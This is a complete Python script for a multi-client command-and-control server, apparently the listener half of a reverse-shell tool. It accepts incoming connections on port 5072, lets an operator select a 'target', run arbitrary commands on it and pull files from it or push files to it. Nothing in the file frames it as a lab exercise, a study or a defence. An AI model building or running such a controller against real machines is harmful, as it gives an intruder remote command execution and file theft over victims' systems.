#!/usr/bin/env python3
import socket
import sys
import threading
import time
from queue import Queue

all_connections = []
all_address = []
HOST = ""
PORT = 5072
queue = Queue()
# creating a socket to connect two computers


def create_socket():
    try:
        global s
        s = socket.socket()
    except:
        print("error creating socket")

# Binding the socket and listening for connections


def bind_socket():
    try:
        global s
        print(f"Binding the server port {str(PORT)}")
        s.bind((HOST, PORT))
        s.listen(3)
    except:
        print("Socket Binding Error" + "\n" + "Retrying...")
        bind_socket()

# Accepting Client Connections


def accept_client_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            connection, address = s.accept()
            s.setblocking(1)  # prevents timeout
            all_connections.append(connection)
            all_address.append(address)
            print(
                f"Connection has been established with : {address[0]} at the port {address[1]}")
            print("Enter 'list' to show all available connections.")

        except:
            print("Error creating connections")

# listing all connections


def list_connections():
    results = ''
    print("----Available Clients----" + "\n")
    for i, c in enumerate(all_connections):
        try:
            c.send(str.encode(' '))
            c.recv(2048)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(
            i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
        print(results)
    print("Enter 'select <id>' to select a connection to work on.")


# selecting target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn

    except:
        print("Selection not valid")
        return None

# sending commands to connected clients


def send_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'getfile':
                conn.send(str.encode(cmd))
                filename = input("filename>")
                conn.send(str.encode(filename))
                f = open(filename, 'wb')
                i = conn.recv(1024)
                while not ("complete" in str(i)):
                    f.write(i)
                    i = conn.recv(1024)
                f.close()
                print("Transfer Complete")
                continue

            if cmd == 'sendfile':
                conn.send(str.encode(cmd))
                filename = input("filename>")
                conn.send(str.encode(filename))
                f = open(filename, 'rb')
                i = f.read(1024)
                while(i):
                    conn.send(i)
                    i = f.read(1024)
                f.close()
                conn.send(str.encode("complete"))
                continue

            if cmd == 'workdone':
                conn.send(str.encode(cmd))
                conn.close()
                break

            if cmd == 'quitclient':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Command not recognized")
            break

# main looping function


def start():
    active = True
    while active:
        global s
        cmd = input("You>")
        if cmd == 'closeserver':
            for c in all_connections:
                c.send(str.encode('workdone'))

        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_commands(conn)
        else:
            print("Enter 'list' to list all connections availabele.")

# Handling multiple clients


def create_workers():
    for _ in range(2):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_client_connections()
        if x == 2:
            start()

        queue.task_done()


def create_jobs():
    for x in [1, 2]:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
